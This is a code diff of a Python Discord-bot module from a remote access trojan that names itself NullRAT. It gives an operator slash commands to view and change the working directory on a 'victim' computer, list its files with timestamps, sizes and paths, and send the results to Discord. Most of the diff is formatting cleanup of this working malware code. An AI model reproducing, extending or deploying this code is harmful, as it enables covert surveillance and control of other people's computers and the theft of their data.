@@ -3,14 +3,15 @@ from disnake.ext import commands
 from datetime import datetime
 from io import BytesIO
 
-import os, requests, time
-nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
+import os
+import time
+
 
 class DirectoryCommands(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        
-    @commands.slash_command( )
+
+    @commands.slash_command()
     async def get_currentdir(self, ctx, victim):
         """Returns Current Working Directory
 
@@ -18,16 +19,16 @@ class DirectoryCommands(commands.Cog):
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
         """
-        if self.valid(victim):
+        if self.bot.valid(victim):
             await ctx.response.send_message(
                 embed=self.bot.genEmbed(
-                    "Current directory of NullRAT:", 
-                    datetime.now(), 
-                    f"```{os.getcwd()}```"
+                    "Current directory of NullRAT:",
+                    datetime.now(),
+                    f"```{os.getcwd()}```",
                 )
             )
 
-    @commands.slash_command( )
+    @commands.slash_command()
     async def set_currentdir(self, ctx, victim, directory):
         """Change directory to specified location
 
@@ -36,45 +37,47 @@ class DirectoryCommands(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         directory: Directory where NullRAT will change (cd) to
         """
-        if self.valid(victim):
+        if self.bot.valid(victim):
             try:
                 os.chdir(directory)
                 return await ctx.response.send_message(
                     embed=self.bot.genEmbed(
-                        "Successfully changed directory", 
-                        datetime.now(), 
-                        f"New directory:\n```{os.getcwd()}```"
+                        "Successfully changed directory",
+                        datetime.now(),
+                        f"New directory:\n```{os.getcwd()}```",
                     )
                 )
             except FileNotFoundError:
-                await ctx.response.send_message(embed=self.bot.genEmbed( "Directory not found!", datetime.now() ))
+                await ctx.response.send_message(
+                    embed=self.bot.genEmbed("Directory not found!", datetime.now())
+                )
 
-    @commands.slash_command( )
+    @commands.slash_command()
     async def list_rawdir(self, ctx, victim, directory="null"):
         """List all directory contents quickly in a raw format
-        
+
         Parameters
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
         directory: Directory whose contents will be listed (optional)
         """
-        if self.valid(victim):
-            if directory != 'null':
-                try: os.chdir(directory)
-                except FileNotFoundError: return await ctx.response.send_message("Invalid directory!")
-            
+        if self.bot.valid(victim):
+            if directory != "null":
+                try:
+                    os.chdir(directory)
+                except FileNotFoundError:
+                    return await ctx.response.send_message(
+                        embed=self.bot.genEmbed("Invalid directory!", datetime.now())
+                    )
+
             await ctx.response.send_message(
-                file = discord.File(
-                    BytesIO(
-                        bytes( 
-                            os.popen(f"dir").read(), 'utf-8' 
-                        )
-                    ), 
-                    filename="Directory.txt"
+                file=discord.File(
+                    BytesIO(bytes(os.popen("dir").read(), "utf-8")),
+                    filename="Directory.txt",
                 )
             )
-            
-    @commands.slash_command( )
+
+    @commands.slash_command()
     async def list_directory(self, ctx, victim, directory="null"):
         """Lists contents of directory with advanced information
 
@@ -83,96 +86,83 @@ class DirectoryCommands(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         directory: Directory whose contents will be listed (optional)
         """
-        if self.valid(victim):
+        if self.bot.valid(victim):
             try:
-                contents = os.listdir( 
-                    os.getcwd() if directory == "null" else directory 
-                )
+                contents = os.listdir(os.getcwd() if directory == "null" else directory)
             except FileNotFoundError:
                 return await ctx.response.send_message(
-                    embed = self.bot.genEmbed(
-                        "Invalid directory!",
-                        datetime.now()
-                    )
+                    embed=self.bot.genEmbed("Invalid directory!", datetime.now())
                 )
-            
-            try: os.chdir(directory)
-            except: pass
-            
+
+            try:
+                os.chdir(directory)
+            except:  # noqa: E722
+                pass
+
             await ctx.response.send_message(
-                embed = self.bot.genEmbed(
-                    "Directory Contents:",
-                    datetime.now()
-                )
+                embed=self.bot.genEmbed("Directory Contents:", datetime.now())
             )
-            
+
             embeds = []
-            
+
             for c in contents:
-                embed = self.bot.genEmbed(f"**{c}**",datetime.now(),'_ _')
-                    
+                embed = self.bot.genEmbed(f"**{c}**", datetime.now(), "_ _")
+
                 embed.add_field(
-                    name = "Type:", 
-                    value = "Directory" if os.path.isdir(c) else "File", 
-                    inline = False
+                    name="Type:",
+                    value="Directory" if os.path.isdir(c) else "File",
+                    inline=False,
                 )
-                
-                try:    
+
+                try:
                     embed.add_field(
-                        name = "Created on:", 
-                        value = str(
-                            time.ctime(
-                                os.path.getctime(c)
-                            )
-                        ), inline = False
+                        name="Created on:",
+                        value=str(time.ctime(os.path.getctime(c))),
+                        inline=False,
                     )
-                    
+
                     embed.add_field(
-                        name = "Last modified:", 
-                        value = str(
-                            time.ctime(
-                                os.path.getmtime(c)
-                            )
-                        ), inline = False
+                        name="Last modified:",
+                        value=str(time.ctime(os.path.getmtime(c))),
+                        inline=False,
                     )
                 except FileNotFoundError:
                     pass
-                
+
                 try:
-                    if os.path.isdir(c) == False:
+                    if not os.path.isdir(c):
                         embed.add_field(
-                            name = "File Size:",
-                            value = convert_bytes(os.path.getsize(c)),
-                            inline = False
+                            name="File Size:",
+                            value=convert_bytes(os.path.getsize(c)),
+                            inline=False,
                         )
                     else:
-                        embed.add_field(
-                            name = "File Size:",
-                            value = 'N/A',
-                            inline = False
-                        )
+                        embed.add_field(name="File Size:", value="N/A", inline=False)
                 except:
                     pass
-                    
+
                 embed.add_field(
-                    name = "Absolute Path:", 
-                    value = "```" + os.path.abspath(c) + "```", 
-                    inline = False
+                    name="Absolute Path:",
+                    value="```" + os.path.abspath(c) + "```",
+                    inline=False,
                 )
-                
+
                 embeds.append(embed)
-                
-            await ctx.channel.send(embed = embeds[0], view = Menu(embeds))
+
+            await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
+
 
 def convert_bytes(size):
-    """ Convert bytes to KB, or MB or GB"""
-    for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
+    """Convert bytes to KB, or MB or GB"""
+    for x in ["bytes", "KB", "MB", "GB", "TB"]:
         if size < 1024.0:
             return "%3.1f %s" % (size, x)
         size /= 1024.0
-        
+
+
 def setup(bot: commands.Bot):
     bot.add_cog(DirectoryCommands(bot))
+
 
 class Menu(discord.ui.View):
     def __init__(self, embeds):
@@ -187,7 +177,9 @@ class Menu(discord.ui.View):
             embed.set_footer(text=f"Page {i + 1} of {len(self.embeds)}")
 
     @discord.ui.button(label="<< First", style=discord.ButtonStyle.blurple)
-    async def first_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+    async def first_page(
+        self, button: discord.ui.Button, interaction: discord.MessageInteraction
+    ):
         self.embed_count = 0
         embed = self.embeds[self.embed_count]
         embed.set_footer(text=f"Page 1 of {len(self.embeds)}")
@@ -199,7 +191,9 @@ class Menu(discord.ui.View):
         await interaction.response.edit_message(embed=embed, view=self)
 
     @discord.ui.button(label="< Previous", style=discord.ButtonStyle.secondary)
-    async def prev_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+    async def prev_page(
+        self, button: discord.ui.Button, interaction: discord.MessageInteraction
+    ):
         self.embed_count -= 1
         embed = self.embeds[self.embed_count]
 
@@ -211,7 +205,9 @@ class Menu(discord.ui.View):
         await interaction.response.edit_message(embed=embed, view=self)
 
     @discord.ui.button(label="Next >", style=discord.ButtonStyle.secondary)
-    async def next_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+    async def next_page(
+        self, button: discord.ui.Button, interaction: discord.MessageInteraction
+    ):
         self.embed_count += 1
         embed = self.embeds[self.embed_count]
 
@@ -223,7 +219,9 @@ class Menu(discord.ui.View):
         await interaction.response.edit_message(embed=embed, view=self)
 
     @discord.ui.button(label="Last >>", style=discord.ButtonStyle.blurple)
-    async def last_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+    async def last_page(
+        self, button: discord.ui.Button, interaction: discord.MessageInteraction
+    ):
         self.embed_count = len(self.embeds) - 1
         embed = self.embeds[self.embed_count]
 
